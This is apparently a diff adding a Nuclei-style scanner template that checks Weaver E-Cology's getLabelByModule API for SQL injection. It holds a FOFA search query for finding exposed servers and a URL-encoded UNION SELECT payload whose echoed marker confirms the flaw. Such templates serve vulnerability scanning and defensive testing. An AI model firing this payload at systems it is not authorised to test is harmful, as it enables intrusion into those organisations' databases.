@@ -1,0 +1,22 @@
+id: weaver-ecology-getlabelbymodule-sql
+
+info:
+  name: 泛微E-Cology getLabelByModule SQL注入
+  author: yanxiayue
+  tags: 2024,weaver,sql 
+  metadata:
+    fofa-query: app="泛微-E-Weaver"
+
+requests:
+  - raw:
+      - |
+        GET /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=1%27)%20union%20all%20select%20%27111,%27%20-- HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
+        Connection: close
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "status_code==200 && contains(body,'111')"
